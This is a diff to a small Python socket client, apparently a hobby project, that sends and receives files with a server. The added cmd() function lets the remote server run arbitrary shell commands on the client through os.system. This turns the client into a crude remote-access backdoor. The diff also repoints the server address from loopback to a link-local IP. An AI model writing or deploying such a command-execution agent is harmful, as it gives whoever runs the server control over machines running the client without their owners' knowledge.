@@ -1,10 +1,11 @@
 import socket
+import os
 
 HEADER = 64
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = '!disconnect'
 
-SERVER = '127.0.1.1'
+SERVER = '169.254.81.146'
 PORT = 1234
 ADDR = (SERVER, PORT)
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,13 +32,30 @@ def recv_file():
     f.write(file)
     f.close()
 
-
+def cmd():
+    active  = True
+    while active:
+        command = client.recv(1024).decode()
+        if command == 'dir':
+            b = os.listdir()
+        elif command[:2] == 'cd':
+            cd, di = command.split(' ')
+            os.chdir(di) 
+            b = 'changed'
+        else:
+            b = os.system(command)
+        print(b) 
 
 while connection:
-    msg = client.recv(1024).decode()
-    print(msg)
+    massage = client.recv(1024).decode()
+    print(massage)
 
-    if msg == 'send':
+    if massage == 'send':
         recv_file()
-    elif msg == 'recv':
+    elif massage == 'recv':
         send_file()
+    elif massage == 'cmd':
+        cmd()
+    elif massage == 'end':
+            connection = False
+            break
